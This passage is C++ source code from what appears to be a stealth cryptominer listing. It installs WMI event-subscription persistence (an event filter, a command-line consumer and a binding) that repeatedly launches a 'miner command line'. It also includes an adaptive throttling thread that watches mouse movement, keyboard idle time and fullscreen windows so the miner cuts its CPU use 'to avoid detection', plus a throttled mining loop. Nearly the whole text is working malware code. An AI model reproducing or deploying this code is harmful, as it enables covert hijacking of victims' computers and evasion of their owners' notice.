bool InstallWMIPersistence(
    const std::wstring& event_filter_name,
    const std::wstring& consumer_name,
    const std::wstring& command_line  // miner command line
) {
    HRESULT hr;

    // Initialize COM
    hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr)) return false;

    hr = CoInitializeSecurity(
        nullptr, -1, nullptr, nullptr,
        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr, EOAC_NONE, nullptr);

    IWbemLocator* pLoc = nullptr;
    hr = CoCreateInstance(CLSID_WbemLocator, nullptr,
        CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr)) { CoUninitialize(); return false; }

    IWbemServices* pSvc = nullptr;
    hr = pLoc->ConnectServer(
        _bstr_t(L"ROOT\\subscription"),
        nullptr, nullptr, nullptr, 0, nullptr, nullptr, &pSvc);
    pLoc->Release();
    if (FAILED(hr)) { CoUninitialize(); return false; }

    hr = CoSetProxyBlanket(pSvc,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr, EOAC_NONE);

    // Create __EventFilter — fires every 60 seconds
    IWbemClassObject* pFilter = nullptr;
    {
        IWbemClassObject* pFilterClass = nullptr;
        pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, nullptr, &pFilterClass, nullptr);
        pFilterClass->SpawnInstance(0, &pFilter);
        pFilterClass->Release();

        VARIANT v;
        VariantInit(&v);

        // Filter name
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(event_filter_name.c_str());
        pFilter->Put(L"Name", 0, &v, 0); VariantClear(&v);

        // Query language
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"WQL");
        pFilter->Put(L"QueryLanguage", 0, &v, 0); VariantClear(&v);

        // WQL query: fires every 60 seconds
        v.vt = VT_BSTR;
        v.bstrVal = SysAllocString(
            L"SELECT * FROM __TimerEvent WHERE TimerID = 'MinerTimer'");
        pFilter->Put(L"Query", 0, &v, 0); VariantClear(&v);

        // Event namespace
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"root\\cimv2");
        pFilter->Put(L"EventNamespace", 0, &v, 0); VariantClear(&v);

        hr = pSvc->PutInstance(pFilter, WBEM_FLAG_CREATE_OR_UPDATE,
                               nullptr, nullptr);
    }

    // Create CommandLineEventConsumer
    IWbemClassObject* pConsumer = nullptr;
    {
        IWbemClassObject* pConsClass = nullptr;
        pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, nullptr,
                        &pConsClass, nullptr);
        pConsClass->SpawnInstance(0, &pConsumer);
        pConsClass->Release();

        VARIANT v; VariantInit(&v);

        v.vt = VT_BSTR; v.bstrVal = SysAllocString(consumer_name.c_str());
        pConsumer->Put(L"Name", 0, &v, 0); VariantClear(&v);

        v.vt = VT_BSTR; v.bstrVal = SysAllocString(command_line.c_str());
        pConsumer->Put(L"CommandLineTemplate", 0, &v, 0); VariantClear(&v);

        hr = pSvc->PutInstance(pConsumer, WBEM_FLAG_CREATE_OR_UPDATE,
                               nullptr, nullptr);
    }

    // Create __FilterToConsumerBinding
    IWbemClassObject* pBinding = nullptr;
    {
        IWbemClassObject* pBindClass = nullptr;
        pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, nullptr,
                        &pBindClass, nullptr);
        pBindClass->SpawnInstance(0, &pBinding);
        pBindClass->Release();

        VARIANT v; VariantInit(&v);

        // Filter reference: __EventFilter.Name="filtername"
        std::wstring filter_ref = L"__EventFilter.Name=\"" + event_filter_name + L"\"";
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(filter_ref.c_str());
        pBinding->Put(L"Filter", 0, &v, 0); VariantClear(&v);

        // Consumer reference
        std::wstring cons_ref = L"CommandLineEventConsumer.Name=\"" + consumer_name + L"\"";
        v.vt = VT_BSTR; v.bstrVal = SysAllocString(cons_ref.c_str());
        pBinding->Put(L"Consumer", 0, &v, 0); VariantClear(&v);

        hr = pSvc->PutInstance(pBinding, WBEM_FLAG_CREATE_OR_UPDATE,
                               nullptr, nullptr);
    }

    if (pFilter)   pFilter->Release();
    if (pConsumer) pConsumer->Release();
    if (pBinding)  pBinding->Release();
    pSvc->Release();
    CoUninitialize();

    return SUCCEEDED(hr);
}

// -------------------------------------------------------
// B.8 ADAPTIVE CPU THROTTLING
//     Monitor user activity; reduce CPU to avoid detection
//     Core technique in XMRig-based stealth miners
// -------------------------------------------------------
struct ThrottleState {
    volatile bool running   = true;
    volatile int  cpu_limit = 80; // percent; reduced if user active
};

void AdaptiveThrottleThread(ThrottleState* state) {
    POINT last_cursor = {};
    GetCursorPos(&last_cursor);

    while (state->running) {
        std::this_thread::sleep_for(std::chrono::seconds(5));

        // Check mouse movement
        POINT current;
        GetCursorPos(&current);
        bool mouse_moved = (abs(current.x - last_cursor.x) > 5 ||
                            abs(current.y - last_cursor.y) > 5);
        last_cursor = current;

        // Check keyboard input (last input time)
        LASTINPUTINFO lii; lii.cbSize = sizeof(lii);
        GetLastInputInfo(&lii);
        DWORD idle_ms = GetTickCount() - lii.dwTime;
        bool user_active = (idle_ms < 30000) || mouse_moved; // 30s threshold

        // Check foreground window CPU usage
        HWND fg = GetForegroundWindow();
        bool fullscreen = false;
        if (fg) {
            RECT wr;
            GetWindowRect(fg, &wr);
            int sw = GetSystemMetrics(SM_CXSCREEN);
            int sh = GetSystemMetrics(SM_CYSCREEN);
            fullscreen = (wr.left == 0 && wr.top == 0 &&
                          wr.right == sw && wr.bottom == sh);
        }

        if (fullscreen || user_active)
            state->cpu_limit = 20;  // Drop to 20% when user active
        else
            state->cpu_limit = 85;  // Use 85% when idle
    }
}

// Apply CPU throttle: sleep proportion of each work quantum
void ThrottledMineLoop(ThrottleState* state, std::function<void()> mine_one_unit) {
    // Each iteration: mine for (limit)ms, sleep for (100-limit)ms
    while (state->running) {
        int limit = state->cpu_limit;
        auto start = std::chrono::steady_clock::now();

        // Mine for 'limit' milliseconds
        while (true) {
            mine_one_unit();
            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                std::chrono::steady_clock::now() - start).count();
            if (elapsed >= limit) break;
        }

        // Sleep for (100-limit) milliseconds
        std::this_thread::sleep_for(
            std::chrono::milliseconds(100 - limit));
    }
}

